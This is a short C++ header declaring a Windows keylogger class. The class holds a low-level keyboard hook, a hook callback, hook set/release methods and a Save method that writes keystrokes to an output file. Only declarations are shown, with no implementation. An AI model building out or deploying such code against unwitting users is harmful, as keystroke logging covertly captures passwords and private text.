#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>

#pragma comment(lib,"user32.lib")

#pragma once
//#define dll __declspec(dllimport)


class KeyLog {
private:
	static HHOOK _hook; // змінна для зберігання HANDLE хука
	static KBDLLHOOKSTRUCT kbdStruct;
	static std::ofstream* OUTPUT_FILE;
public:
	KeyLog();
	KeyLog(HHOOK thisHook, KBDLLHOOKSTRUCT thisKbdStruct, std::ofstream* thisOUTPUT_FILE);
	//KeyLog(const KeyLog&);
	~KeyLog();

	static HHOOK GetHook();
	static KBDLLHOOKSTRUCT GetKbdStruct();
	static std::ofstream &GetOutputFile();

	static void SetHHook(HHOOK _hook);
	static void SetKbdStruct(KBDLLHOOKSTRUCT thisKbdStruct);
	static void SetOutputFile(std::ofstream* OUTPUT_FILE);

	static LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
	static void SetHook();
	static int Save(int key_stroke);
	static void ReleaseHook();
};
